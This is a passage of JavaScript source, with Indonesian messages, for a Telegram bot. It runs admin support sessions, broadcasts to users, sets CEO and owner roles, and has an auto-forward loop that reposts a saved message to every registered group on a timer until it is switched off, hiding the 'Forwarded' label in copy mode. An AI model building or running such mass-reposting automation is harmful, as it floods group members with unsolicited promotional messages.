  // == BATALKAN SESI ADMIN ==
  if (text === "❌ Tutup Sesi" && chatSessions[userId]?.active) {

    bot.deleteMessage(chatId, msg.message_id).catch(() => {});
    
    delete chatSessions[userId];
    const caption = `<blockquote>❌ ─── 《 ❝ 𝗦𝗘𝗦𝗜 𝗗𝗜𝗧𝗨𝗧𝗨𝗣 ❞ 》 ─── ❌</blockquote>

🌸 <b>Informasi Sesi</b>
➥ <b>Status:</b> Sesi ditutup
➥ <b>Pesan:</b> Terima kasih telah menghubungi admin

📝 Silakan hubungi admin lagi jika diperlukan`;
    
    return replaceMenu(chatId, caption, {
      keyboard: [
        [{ text: "🔙 Kembali" }]
      ],
      resize_keyboard: true
    });
  }

  // == KIRIM PESAN KE ADMIN ==
  if (chatSessions[userId]?.active) {
    const ownerId = chatSessions[userId].ownerId;
    try {
      await bot.forwardMessage(ownerId, chatId, msg.message_id);
      await bot.sendMessage(chatId, `
<blockquote>✅ 𝗣𝗲𝘀𝗮𝗻 𝗧𝗲𝗿𝗸𝗶𝗿𝗶𝗺</blockquote>
➥ <b>Status:</b> Pesan berhasil dikirim ke Admin
➥ <b>Info:</b> Admin akan merespons secepatnya`, { 
        parse_mode: "HTML" 
      });
    } catch {
      delete chatSessions[userId];
      await bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗚𝗮𝗴𝗮𝗹 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺</blockquote>
➥ <b>Status:</b> Gagal mengirim pesan ke Admin
➥ <b>Solusi:</b> Coba lagi nanti atau hubungi langsung`, { 
        parse_mode: "HTML" 
      });
    }
    return;
  }

  // == OWNER BALAS USER ==
  if (isAnyOwner(userId) && msg.reply_to_message) {
    const replied = msg.reply_to_message;
    const fwdFrom = replied.forward_from;
    let targetUserId;
    if (fwdFrom) targetUserId = fwdFrom.id.toString();
    else if (replied.text?.includes("tg://user?id=")) {
      const match = replied.text.match(/tg:\/\/user\?id=(\d+)/);
      if (match) targetUserId = match[1];
    }

    if (targetUserId && chatSessions[targetUserId]?.active) {
      try {
        if (msg.text) await bot.sendMessage(targetUserId, msg.text);
        else if (msg.photo) await bot.sendPhoto(targetUserId, msg.photo.pop().file_id, { caption: msg.caption || "" });
        await bot.sendMessage(userId, `
<blockquote>✅ 𝗣𝗲𝘀𝗮𝗻 𝗧𝗲𝗿𝗸𝗶𝗿𝗶𝗺</blockquote>
➥ <b>Status:</b> Pesan berhasil dikirim ke user
➥ <b>User ID:</b> <code>${targetUserId}</code>`, { 
          parse_mode: "HTML" 
        });
      } catch {
        await bot.sendMessage(userId, `
<blockquote>⚠️ 𝗚𝗮𝗴𝗮𝗹 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺</blockquote>
➥ <b>Status:</b> Gagal mengirim ke user
➥ <b>User ID:</b> <code>${targetUserId}</code>`, { 
          parse_mode: "HTML" 
        });
      }
    }
  }
});

async function replaceMenu(chatId, caption, buttons) {
  try {
    if (activeMenus[chatId]) {
      try {
        await bot.deleteMessage(chatId, activeMenus[chatId]);
      } catch (e) {}
      delete activeMenus[chatId];
    }

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
      caption,
      parse_mode: "HTML",
      reply_markup: {
        keyboard: buttons.keyboard,
        resize_keyboard: buttons.resize_keyboard,
        one_time_keyboard: buttons.one_time_keyboard || false
      }
    });

    activeMenus[chatId] = sent.message_id;
  } catch (err) {
    console.error("replaceMenu error:", err);

    const sent = await bot.sendMessage(chatId, caption, {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: buttons.keyboard,
        resize_keyboard: buttons.resize_keyboard,
        one_time_keyboard: buttons.one_time_keyboard || false
      }
    });
    activeMenus[chatId] = sent.message_id;
  }
}

// === /sharemsg ===
bot.onText(/^\/sharemsg$/, async (msg) => {
  if (!(await cekAkses("premium", msg))) return;
  if (!(await requireNotBlacklisted(msg))) return;
  if (!(await requireNotMaintenance(msg))) return;

  const senderId = msg.from.id.toString();
  const chatId = msg.chat.id;
  const data = loadData();

  const isPremium = data.premium?.[senderId] && Math.floor(Date.now() / 1000) < data.premium[senderId];
  const isOwner = isAnyOwner(senderId);

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, `
<blockquote>❌ 𝗙𝗼𝗿𝗺𝗮𝘁 𝗦𝗮𝗹𝗮𝗵</blockquote>

🌸 <b>Cara Penggunaan</b>
➥ <b>1.</b> Reply pesan yang ingin di-share
➥ <b>2.</b> Ketik <code>/sharemsg</code>

📝 <b>Keterangan</b>
➥ Pesan akan dikirim ke semua grup terdaftar
➥ Fitur khusus user premium

👋 Hai <b>${msg.from.first_name}</b> 🌸`, 
    { parse_mode: "HTML" });
  }

  const keyboard = { inline_keyboard: [] };

  keyboard.inline_keyboard.push([
    { 
      text: "📤 Copy Message", 
      callback_data: `sharemsg_copy_${chatId}_${msg.reply_to_message.message_id}_${senderId}` 
    },
  ]);

  if (isOwner) {
    keyboard.inline_keyboard.push([
      { 
        text: "📎 Forward Message", 
        callback_data: `sharemsg_forward_${chatId}_${msg.reply_to_message.message_id}_${senderId}` 
      },
    ]);
  }

  await bot.sendMessage(
    chatId,
    `<blockquote>📤 𝗣𝗶𝗹𝗶𝗵 𝗠𝗼𝗱𝗲 𝗣𝗲𝗻𝗴𝗶𝗿𝗶𝗺𝗮𝗻</blockquote>

🌸 <b>Metode Pengiriman</b>
${isOwner ? 
`➥ <b>📤 Copy Message</b>
  └ Tanpa label "Forwarded"
  
➥ <b>📎 Forward Message</b>
  └ Dengan label asli` :
`➥ <b>📤 Copy Message</b>
  └ Tanpa label "Forwarded"`}

📝 <b>Keterangan</b>
➥ Pilih metode sesuai kebutuhan Anda
➥ Pesan akan dikirim ke semua grup`,
    { parse_mode: "HTML", reply_markup: keyboard }
  );
});

bot.on("callback_query", async (query) => {
  try {
    const data = query.data;
    if (!data.startsWith("sharemsg_")) return;

    const [_, mode, chatId, replyMsgId, ownerId] = data.split("_");
    const fromId = query.from.id.toString();

    if (fromId !== ownerId) {
      return bot.answerCallbackQuery(query.id, { 
        text: "❌ Tombol ini bukan untuk kamu!", 
        show_alert: true 
      });
    }

    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: query.message.chat.id, message_id: query.message.message_id }
    ).catch(() => {});
    
    await bot.answerCallbackQuery(query.id, { 
      text: "🔄 Memproses pengiriman...", 
      show_alert: false 
    });

    const store = loadData();
    const groups = store.groups || [];
    const mainOwner = OWNER_IDS?.[0];

    if (groups.length === 0) {
      return bot.sendMessage(chatId, `
<blockquote>❌ 𝗧𝗶𝗱𝗮𝗸 𝗔𝗱𝗮 𝗚𝗿𝘂𝗽</blockquote>
➥ <b>Status:</b> Belum ada grup terdaftar
➥ <b>Solusi:</b> Tambahkan grup terlebih dahulu`, 
      { parse_mode: "HTML" });
    }

    const total = groups.length;
    let sukses = 0, gagal = 0;
    let processed = 0;

    const statusMsg = await bot.sendMessage(
      chatId,
      `<blockquote>📡 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺</blockquote>

🌸 <b>Informasi Pengiriman</b>
➥ <b>Total Grup:</b> ${total}
➥ <b>Status:</b> <code>Memulai...</code>
➥ <b>Progress:</b> 0/${total} (0%)

📊 <b>Progress Bar</b>
[░░░░░░░░░░] 0%`,
      { parse_mode: "HTML" }
    );

    for (const groupId of groups) {
      try {
        if (mode === "copy") {
          await bot.copyMessage(groupId, chatId, parseInt(replyMsgId));
        } else {
          await bot.forwardMessage(groupId, chatId, parseInt(replyMsgId));
        }
        sukses++;
      } catch {
        gagal++;
      }
      processed++;

      if (processed % 5 === 0 || processed === total) {
        const progress = Math.round((processed / total) * 100);
        const progressBar = createProgressBar(progress);
        try {
          await bot.editMessageText(
            `<blockquote>📡 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺</blockquote>

🌸 <b>Informasi Pengiriman</b>
➥ <b>Total Grup:</b> ${total}
➥ <b>Status:</b> <code>Berjalan...</code>
➥ <b>Progress:</b> ${processed}/${total} (${progress}%)
➥ <b>✅ Berhasil:</b> ${sukses}
➥ <b>❌ Gagal:</b> ${gagal}

📊 <b>Progress Bar</b>
${progressBar} ${progress}%`,
            {
              chat_id: chatId,
              message_id: statusMsg.message_id,
              parse_mode: "HTML"
            }
          );
        } catch (e) {}
      }
      
      await new Promise((r) => setTimeout(r, 300));
    }

    const hasil = `
<blockquote>✅ 𝗦𝗵𝗮𝗿𝗲 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹</blockquote>

🌸 <b>Hasil Pengiriman</b>
➥ <b>Total Grup:</b> ${total}
➥ <b>✅ Berhasil:</b> ${sukses}
➥ <b>❌ Gagal:</b> ${gagal}
➥ <b>Mode:</b> ${mode === "copy" ? "Copy Message" : "Forward Message"}
➥ <b>Success Rate:</b> ${Math.round((sukses / total) * 100)}%

📝 <b>Keterangan</b>
➥ Pesan berhasil disebarkan ke ${sukses} grup`;

    await bot.editMessageText(hasil, {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      parse_mode: "HTML",
    });

    if (mainOwner && mainOwner !== fromId) {
      const user = query.from;
      const laporan = `
<blockquote>📢 𝗟𝗮𝗽𝗼𝗿𝗮𝗻 𝗦𝗵𝗮𝗿𝗲</blockquote>

🌸 <b>Informasi User</b>
➥ <b>User:</b> <a href="tg://user?id=${fromId}">${user.first_name}</a>
➥ <b>ID:</b> <code>${fromId}</code>

📊 <b>Hasil Pengiriman</b>
➥ <b>Total Grup:</b> ${total}
➥ <b>✅ Berhasil:</b> ${sukses}
➥ <b>❌ Gagal:</b> ${gagal}
➥ <b>Mode:</b> ${mode === "copy" ? "Copy" : "Forward"}
➥ <b>Waktu:</b> ${new Date().toLocaleString("id-ID")}`;
      
      await bot.sendMessage(mainOwner, laporan, { 
        parse_mode: "HTML" 
      }).catch(() => {});
    }
  } catch (err) {
    console.error("❌ Error sharemsg:", err);
    bot.sendMessage(query.message.chat.id, `
<blockquote>❌ 𝗘𝗿𝗿𝗼𝗿</blockquote>
➥ <b>Status:</b> Terjadi kesalahan saat memproses
➥ <b>Solusi:</b> Silakan coba lagi nanti`, 
    { parse_mode: "HTML" });
  }
});

// === /broadcast ===
bot.onText(/^\/broadcast$/, async (msg) => {
  if (!(await cekAkses("owner", msg))) return;
  if (!(await requireNotBlacklisted(msg))) return;
  if (!(await requireNotMaintenance(msg))) return;

  const senderId = msg.from.id.toString();
  const chatId = msg.chat.id;
  const data = loadData();

  try {
    const isMain = isMainOwner(senderId);
    
    if (!isMain) {
      if (!data.cooldowns) data.cooldowns = {};
      if (!data.cooldowns.broadcast) data.cooldowns.broadcast = {};

      const now = Math.floor(Date.now() / 1000);
      const lastUse = data.cooldowns.broadcast[senderId] || 0;
      const cooldown = getGlobalCooldownMinutes() * 60;

      if (now - lastUse < cooldown) {
        const sisa = cooldown - (now - lastUse);
        const menit = Math.floor(sisa / 60);
        const detik = sisa % 60;
        return bot.sendMessage(
          chatId,
          `<blockquote>⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻</blockquote>

🌸 <b>Informasi Cooldown</b>
➥ <b>Tunggu:</b> ${menit}m ${detik}s
➥ <b>Status:</b> Sebelum bisa broadcast lagi

📝 <b>Keterangan</b>
➥ Fitur broadcast memiliki jeda waktu
➥ Silakan tunggu hingga cooldown selesai`,
          { parse_mode: "HTML" }
        );
      }

      data.cooldowns.broadcast[senderId] = now;
      saveData(data);
    }

    if (!msg.reply_to_message) {
      return bot.sendMessage(chatId, `
<blockquote>❌ 𝗙𝗼𝗿𝗺𝗮𝘁 𝗦𝗮𝗹𝗮𝗵</blockquote>

🌸 <b>Cara Penggunaan</b>
➥ <b>1.</b> Reply pesan yang ingin di-broadcast
➥ <b>2.</b> Ketik <code>/broadcast</code>

📝 <b>Keterangan</b>
➥ Pesan akan dikirim ke semua user terdaftar`,
      { parse_mode: "HTML" });
    }

    const users = [...new Set(data.users || [])];
    if (users.length === 0) {
      return bot.sendMessage(chatId, `
<blockquote>❌ 𝗧𝗶𝗱𝗮𝗸 𝗔𝗱𝗮 𝗨𝘀𝗲𝗿</blockquote>
➥ <b>Status:</b> Belum ada user terdaftar
➥ <b>Solusi:</b> Tunggu hingga ada user bergabung`, 
      { parse_mode: "HTML" });
    }

    const total = users.length;
    let sukses = 0, gagal = 0;
    let processed = 0;
    const reply = msg.reply_to_message;

    const statusMsg = await bot.sendMessage(
      chatId,
      `<blockquote>📡 𝗠𝗲𝗺𝘂𝗹𝗮𝗶 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁</blockquote>

🌸 <b>Informasi Broadcast</b>
➥ <b>Total User:</b> ${total}
➥ <b>Status:</b> <code>Memulai...</code>
➥ <b>Progress:</b> 0/${total} (0%)

📊 <b>Progress Bar</b>
[░░░░░░░░░░] 0%`,
      { parse_mode: "HTML" }
    );

    for (const userId of users) {
      try {
        await bot.copyMessage(userId, chatId, reply.message_id);
        sukses++;
      } catch {
        gagal++;
      }
      processed++;
      
      if (processed % 10 === 0 || processed === total) {
        const progress = Math.round((processed / total) * 100);
        const progressBar = createProgressBar(progress);
        try {
          await bot.editMessageText(
            `<blockquote>📡 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁</blockquote>

🌸 <b>Informasi Broadcast</b>
➥ <b>Total User:</b> ${total}
➥ <b>Status:</b> <code>Berjalan...</code>
➥ <b>Progress:</b> ${processed}/${total} (${progress}%)
➥ <b>✅ Berhasil:</b> ${sukses}
➥ <b>❌ Gagal:</b> ${gagal}

📊 <b>Progress Bar</b>
${progressBar} ${progress}%`,
            {
              chat_id: chatId,
              message_id: statusMsg.message_id,
              parse_mode: "HTML"
            }
          );
        } catch (e) {}
      }
      
      await new Promise((r) => setTimeout(r, 300));
    }

    await bot.editMessageText(
      `<blockquote>✅ 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗦𝗲𝗹𝗲𝘀𝗮𝗶</blockquote>

🌸 <b>Hasil Pengiriman</b>
➥ <b>Total User:</b> ${total}
➥ <b>✅ Berhasil:</b> ${sukses}
➥ <b>❌ Gagal:</b> ${gagal}
➥ <b>Success Rate:</b> ${Math.round((sukses / total) * 100)}%

📝 <b>Keterangan</b>
➥ Pesan berhasil dikirim ke ${sukses} user`,
      {
        chat_id: chatId,
        message_id: statusMsg.message_id,
        parse_mode: "HTML",
      }
    );
  } catch (err) {
    console.error("❌ Error broadcast:", err);
    bot.sendMessage(chatId, `
<blockquote>❌ 𝗘𝗿𝗿𝗼𝗿</blockquote>
➥ <b>Status:</b> Terjadi kesalahan saat memproses
➥ <b>Solusi:</b> Silakan coba lagi nanti`, 
    { parse_mode: "HTML" });
  }
});

// === /autoshare ===
bot.onText(/^\/auto\s*(on|off|status)?$/i, async (msg, match) => {
  if (!(await cekAkses("owner", msg))) return;

  const userId = msg.from.id.toString();
  const chatId = msg.chat.id;
  const arg = (match[1] || "").toLowerCase();

  if (!autoForwards[userId]) {
    autoForwards[userId] = {
      active: false,
      original: null,
      lastSent: 0,
      round: 1,
      username: msg.from.username || "unknown",
      scheduledStart: 0,
      statusMessageId: null
    };
  }

  const conf = autoForwards[userId];

  if (arg === "off") {
    conf.active = false;
    conf.scheduledStart = 0;

    if (conf.statusMessageId) {
      try {
        await bot.deleteMessage(chatId, conf.statusMessageId);
      } catch (e) {}
      conf.statusMessageId = null;
    }
    return bot.sendMessage(chatId, `
<blockquote>❌ 𝗔𝘂𝘁𝗼𝗙𝗼𝗿𝘄𝗮𝗿𝗱 𝗗𝗶𝗺𝗮𝘁𝗶𝗸𝗮𝗻</blockquote>

🌸 <b>Informasi Sistem</b>
➥ <b>Status:</b> AutoForward dihentikan
➥ <b>Putaran:</b> ${conf.round}
➥ <b>Mode:</b> Nonaktif

📝 <b>Keterangan</b>
➥ Sistem auto-forward telah dihentikan`,
    { parse_mode: "HTML" });
  }

  if (arg === "status") {
    const status = conf.active ? 
      (conf.scheduledStart > Date.now() ? "⏳ MENUNGGU JEDA" : "🟢 AKTIF") : 
      "🔴 NONAKTIF";
    const source = conf.original ? "✅ Tersedia" : "❌ Belum diset";
    const groups = loadData().groups || [];
    const waitingTime = conf.scheduledStart > Date.now() ? 
      `\n➥ <b>⏰ Mulai dalam:</b> ${Math.ceil((conf.scheduledStart - Date.now()) / 1000)} detik` : "";
    
    return bot.sendMessage(chatId, `
<blockquote>📊 𝗦𝘁𝗮𝘁𝘂𝘀 𝗔𝘂𝘁𝗼𝗙𝗼𝗿𝘄𝗮𝗿𝗱</blockquote>

🌸 <b>Informasi Status</b>
➥ <b>Status:</b> ${status}${waitingTime}
➥ <b>Pesan:</b> ${source}
➥ <b>Grup Target:</b> ${groups.length} grup
➥ <b>Putaran:</b> ${conf.round} kali
➥ <b>Jeda:</b> ${getGlobalCooldownMinutes()} menit`,
    { parse_mode: "HTML" });
  }

  if (!conf.original) {
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗣𝗲𝘀𝗮𝗻 𝗕𝗲𝗹𝘂𝗺 𝗗𝗶𝘀𝗲𝘁</blockquote>

🌸 <b>Cara Penggunaan</b>
➥ <b>1.</b> Reply pesan yang ingin di-auto forward
➥ <b>2.</b> Ketik <code>/setpesan</code>

📝 <b>Keterangan</b>
➥ Set pesan terlebih dahulu sebelum mengaktifkan`,
    { parse_mode: "HTML" });
  }

  conf.scheduledStart = Date.now() + 5000; // 5 detik
  conf.active = true;
  const groups = loadData().groups || [];
  
  const statusMsg = await bot.sendMessage(chatId, `
<blockquote>⏳ 𝗔𝘂𝘁𝗼𝗙𝗼𝗿𝘄𝗮𝗿𝗱 𝗗𝗶𝗷𝗮𝗱𝘄𝗮𝗹𝗸𝗮𝗻</blockquote>

🌸 <b>Informasi Jadwal</b>
➥ <b>Status:</b> ⏳ MENUNGGU
➥ <b>Grup Target:</b> ${groups.length} grup
➥ <b>Mulai dalam:</b> 5 detik
➥ <b>Putaran berikutnya:</b> ${conf.round}

📝 <b>Keterangan</b>
➥ AutoForward akan mulai otomatis dalam 5 detik
➥ Sistem akan berjalan terus hingga dimatikan`,
  { parse_mode: "HTML" });

  conf.statusMessageId = statusMsg.message_id;
});

// === LOOP AUTO-FORWARD UTAMA YANG DIMODIFIKASI - PAKAI EDIT MESSAGE ===
setInterval(async () => {
  try {
    const now = Date.now();
    const data = loadData();
    const groups = data.groups || [];
    if (!groups.length) return;

    const cooldownMs = getGlobalCooldownMs();
    const delayPerGroup = 300;

    for (const userId in autoForwards) {
      const conf = autoForwards[userId];
      
      if (conf.active && conf.statusMessageId) {
        try {
          const timeLeft = conf.scheduledStart > now ? Math.ceil((conf.scheduledStart - now) / 1000) : 0;
          const statusText = conf.scheduledStart > now ? 
            `⏳ MENUNGGU (${timeLeft}s)` : "🟢 SEDANG BERJALAN";

          await bot.editMessageText(`
<blockquote>🔄 𝗔𝘂𝘁𝗼𝗙𝗼𝗿𝘄𝗮𝗿𝗱 𝗦𝘁𝗮𝘁𝘂𝘀 𝗟𝗶𝘃𝗲</blockquote>

🌸 <b>Informasi Status</b>
➥ <b>Status:</b> ${statusText}
➥ <b>Grup Target:</b> ${groups.length} grup
➥ <b>Putaran berikutnya:</b> ${conf.round}
➥ <b>Jeda:</b> ${getGlobalCooldownMinutes()} menit
${conf.scheduledStart > now ? `➥ <b>⏰ Mulai dalam:</b> ${timeLeft} detik` : '➥ <b>🎯 Status:</b> Sedang memproses...'}`,
          {
            chat_id: userId,
            message_id: conf.statusMessageId,
            parse_mode: "HTML"
          });
        } catch (e) {
          if (e.response && e.response.statusCode === 400) {
            conf.statusMessageId = null;
          }
        }
      }
      
      if (conf.active && conf.scheduledStart > 0 && now >= conf.scheduledStart) {
        console.log(`🚀 Starting auto-forward for user ${userId}, round ${conf.round}`);
        
        conf.scheduledStart = 0;
        conf.lastSent = now;

        if (conf.statusMessageId) {
          try {
            await bot.editMessageText(`
<blockquote>🎯 𝗔𝘂𝘁𝗼𝗙𝗼𝗿𝘄𝗮𝗿𝗱 𝗦𝗲𝗱𝗮𝗻𝗴 𝗕𝗲𝗿𝗷𝗮𝗹𝗮𝗻</blockquote>

🌸 <b>Informasi Proses</b>
➥ <b>Status:</b> 🟢 SEDANG BERJALAN
➥ <b>Grup Target:</b> ${groups.length} grup
➥ <b>Putaran:</b> ${conf.round}
➥ <b>Progress:</b> Memulai pengiriman...

📝 <b>Keterangan</b>
➥ Mengirim ke ${groups.length} grup...`,
            {
              chat_id: userId,
              message_id: conf.statusMessageId,
              parse_mode: "HTML"
            });
          } catch (e) {}
        }

        let sukses = 0, gagal = 0;
        let processed = 0;

        for (const groupId of groups) {
          try {
            await bot.copyMessage(groupId, conf.original.chatId, conf.original.messageId);
            sukses++;
          } catch (error) {
            console.log(`❌ Gagal kirim ke ${groupId}:`, error.message);
            gagal++;
          }
          processed++;
          
          if (conf.statusMessageId && (processed % 10 === 0 || processed === groups.length)) {
            const progress = Math.round((processed/groups.length)*100);
            const progressBar = createProgressBar(progress);
            try {
              await bot.editMessageText(`
<blockquote>🎯 𝗔𝘂𝘁𝗼𝗙𝗼𝗿𝘄𝗮𝗿𝗱 𝗦𝗲𝗱𝗮𝗻𝗴 𝗕𝗲𝗿𝗷𝗮𝗹𝗮𝗻</blockquote>

🌸 <b>Informasi Proses</b>
➥ <b>Status:</b> 🟢 SEDANG BERJALAN
➥ <b>Grup Target:</b> ${groups.length} grup
➥ <b>Putaran:</b> ${conf.round}
➥ <b>Progress:</b> ${processed}/${groups.length} (${progress}%)
➥ <b>✅ Berhasil:</b> ${sukses}
➥ <b>❌ Gagal:</b> ${gagal}

📊 <b>Progress Bar</b>
${progressBar} ${progress}%`,
              {
                chat_id: userId,
                message_id: conf.statusMessageId,
                parse_mode: "HTML"
              });
            } catch (e) {}
          }
          
          await new Promise((r) => setTimeout(r, delayPerGroup));
        }

        if (conf.statusMessageId) {
          try {
            await bot.editMessageText(`
<blockquote>✅ 𝗔𝘂𝘁𝗼𝗙𝗼𝗿𝘄𝗮𝗿𝗱 𝗦𝗲𝗹𝗲𝘀𝗮𝗶</blockquote>

🌸 <b>Hasil Putaran ${conf.round}</b>
➥ <b>Status:</b> ⏳ MENUNGGU JEDA BERIKUTNYA
➥ <b>✅ Berhasil:</b> ${sukses}
➥ <b>❌ Gagal:</b> ${gagal}
➥ <b>Total:</b> ${groups.length} grup
➥ <b>Jeda berikutnya:</b> ${getGlobalCooldownMinutes()} menit
➥ <b>Putaran selanjutnya:</b> ${conf.round + 1}

📝 <b>Keterangan</b>
➥ Putaran berikutnya dalam ${getGlobalCooldownMinutes()} menit...`,
            {
              chat_id: userId,
              message_id: conf.statusMessageId,
              parse_mode: "HTML"
            });
          } catch (e) {}
        }

        conf.round++;
        conf.scheduledStart = now + cooldownMs;
      }
    }
  } catch (err) {
    console.error("❌ Error in auto-forward loop:", err);
  }
}, 2000);

// Helper function untuk progress bar
function createProgressBar(percentage) {
  const bars = 10;
  const filledBars = Math.round((percentage / 100) * bars);
  const emptyBars = bars - filledBars;
  return `[${'█'.repeat(filledBars)}${'░'.repeat(emptyBars)}]`;
}

bot.onText(/^\/setpesan$/, async (msg) => {
  if (!(await cekAkses("owner", msg))) return;

  const userId = msg.from.id.toString();
  const chatId = msg.chat.id;

  if (!msg.reply_to_message)
    return bot.sendMessage(chatId, "⚠️ Harap *reply* ke pesan yang ingin disimpan untuk auto-forward.", { parse_mode: "Markdown" });

  autoForwards[userId] = {
    active: false,
    original: {
      chatId: msg.reply_to_message.chat.id,
      messageId: msg.reply_to_message.message_id
    },
    lastSent: 0,
    round: 1,
    username: msg.from.username || "unknown"
  };

  bot.sendMessage(chatId, "✅ Pesan berhasil disimpan.\nGunakan `/auto on` untuk mulai mengirim otomatis.", { parse_mode: "Markdown" });
});

// === /setjeda ===
bot.onText(/^\/setjeda(?:\s+(\d+))?$/, async (msg, match) => {
  if (!(await cekAkses("owner", msg))) return;
  if (!(await cekGroupOnly(msg, bot))) return;
  const senderId = msg.from.id.toString();
  const chatId = msg.chat.id;

  const data = loadData();
  if (!data.settings) data.settings = {};
  if (!data.settings.cooldown) data.settings.cooldown = {};

  const menit = parseInt(match[1]);
  
  if (!match[1]) {
    return bot.sendMessage(chatId, "⚠️ Format salah. Contoh: `/setjeda 15`", { parse_mode: "Markdown" });
  }

  if (isNaN(menit) || menit <= 0) {
    const current = getGlobalCooldownMinutes();
    return bot.sendMessage(chatId, `⚙️ Cooldown saat ini: *${current} menit*`, { parse_mode: "Markdown" });
  }

  data.settings.cooldown.default = menit;
  saveData(data);

  return bot.sendMessage(chatId, `✅ Jeda berhasil diatur ke *${menit} menit*.`, { parse_mode: "Markdown" });
});

// === /addceo ===
bot.onText(/^\/addceo(?:\s+(\d+))?$/, async (msg, match) => {
  if (!(await cekAkses("utama", msg))) return;
  if (!(await cekGroupOnly(msg, bot))) return;
  const chatId = msg.chat.id;
  const targetId = match[1];

  if (!targetId)
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗙𝗼𝗿𝗺𝗮𝘁 𝗦𝗮𝗹𝗮𝗵</blockquote>
➥ <b>Gunakan format:</b> <code>/addceo [user_id]</code>
➥ <b>Contoh:</b> <code>/addceo 123456</code>`, { parse_mode: "HTML" });

  const data = loadData();
  if (!Array.isArray(data.ceo)) data.ceo = [];

  if (data.ceo.includes(targetId))
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗖𝗘𝗢 𝗦𝘂𝗱𝗮𝗵 𝗔𝗱𝗮</blockquote>
➥ <b>User ID:</b> <code>${targetId}</code>
➥ <b>Status:</b> Sudah menjadi CEO`, { parse_mode: "HTML" });

  data.ceo.push(targetId);
  saveData(data);

  bot.sendMessage(chatId, `
<blockquote>💼 𝗖𝗘𝗢 𝗕𝗮𝗿𝘂 𝗗𝗶𝘁𝗮𝗺𝗯𝗮𝗵𝗸𝗮𝗻</blockquote>

🌸 <b>Informasi CEO</b>
➥ <b>ID:</b> <code>${targetId}</code>
➥ <b>Status:</b> Aktif

📝 <b>Keterangan:</b> Gunakan <code>/listceo</code> untuk melihat daftar CEO`, { parse_mode: "HTML" });
});

// === /delceo ===
bot.onText(/^\/delceo(?:\s+(\d+))?$/, async (msg, match) => {
  if (!(await cekAkses("utama", msg))) return;
  if (!(await cekGroupOnly(msg, bot))) return;
  const chatId = msg.chat.id;
  const targetId = match[1];

  if (!targetId)
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗙𝗼𝗿𝗺𝗮𝘁 𝗦𝗮𝗹𝗮𝗵</blockquote>
➥ <b>Gunakan format:</b> <code>/delceo [user_id]</code>
➥ <b>Contoh:</b> <code>/delceo 123456</code>`, { parse_mode: "HTML" });

  const data = loadData();

  if (!Array.isArray(data.ceo) || !data.ceo.includes(targetId))
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗖𝗘𝗢 𝗧𝗶𝗱𝗮𝗸 𝗗𝗶𝘁𝗲𝗺𝘂𝗸𝗮𝗻</blockquote>
➥ <b>User ID:</b> <code>${targetId}</code>
➥ <b>Status:</b> Tidak ditemukan dalam daftar CEO`, { parse_mode: "HTML" });

  data.ceo = data.ceo.filter(id => id !== targetId);
  saveData(data);

  bot.sendMessage(chatId, `
<blockquote>🗑️ 𝗖𝗘𝗢 𝗗𝗶𝗵𝗮𝗽𝘂𝘀</blockquote>

🌸 <b>Informasi CEO</b>
➥ <b>ID:</b> <code>${targetId}</code>
➥ <b>Status:</b> Dihapus

📝 <b>Keterangan:</b> Gunakan <code>/listceo</code> untuk memeriksa daftar terbaru`, { parse_mode: "HTML" });
});

// === /listceo ===
bot.onText(/^\/listceo$/, async (msg) => {
  if (!(await cekAkses("utama", msg))) return;
  if (!(await cekGroupOnly(msg, bot))) return;
  const chatId = msg.chat.id;
  const ceoList = loadData().ceo || [];

  if (ceoList.length === 0)
    return bot.sendMessage(chatId, `<blockquote>📋 𝗗𝗮𝗳𝘁𝗮𝗿 𝗖𝗘𝗢</blockquote>➥ <b>Status:</b> Belum ada CEO yang terdaftar`, { parse_mode: "HTML" });

  const teks = `
<blockquote>💼 𝗗𝗮𝗳𝘁𝗮𝗿 𝗖𝗘𝗢 𝗔𝗸𝘁𝗶𝗳</blockquote>

${ceoList.map((id, i) => `➥ <b>${i + 1}.</b> <code>${id}</code>`).join("\n")}

🌸 <b>Total:</b> ${ceoList.length} CEO
`;
  bot.sendMessage(chatId, teks, { parse_mode: "HTML" });
});

// === /addownjs ===
bot.onText(/^\/addownjs(?:\s+(\d+))?$/, async (msg, match) => {
  if (!(await cekAkses("ceo", msg))) return;
  if (!(await cekGroupOnly(msg, bot))) return;
  const chatId = msg.chat.id;
  const targetId = match[1];

  if (!targetId)
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗙𝗼𝗿𝗺𝗮𝘁 𝗦𝗮𝗹𝗮𝗵</blockquote>
➥ <b>Gunakan format:</b> <code>/addownjs [user_id]</code>
➥ <b>Contoh:</b> <code>/addownjs 123456</code>`, { parse_mode: "HTML" });

  const data = loadData();
  if (!Array.isArray(data.owner)) data.owner = [];

  if (data.owner.includes(targetId))
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗢𝘄𝗻𝗲𝗿 𝗦𝘂𝗱𝗮𝗵 𝗔𝗱𝗮</blockquote>
➥ <b>User ID:</b> <code>${targetId}</code>
➥ <b>Status:</b> Sudah menjadi Owner tambahan`, { parse_mode: "HTML" });

  data.owner.push(targetId);
  saveData(data);

  bot.sendMessage(chatId, `
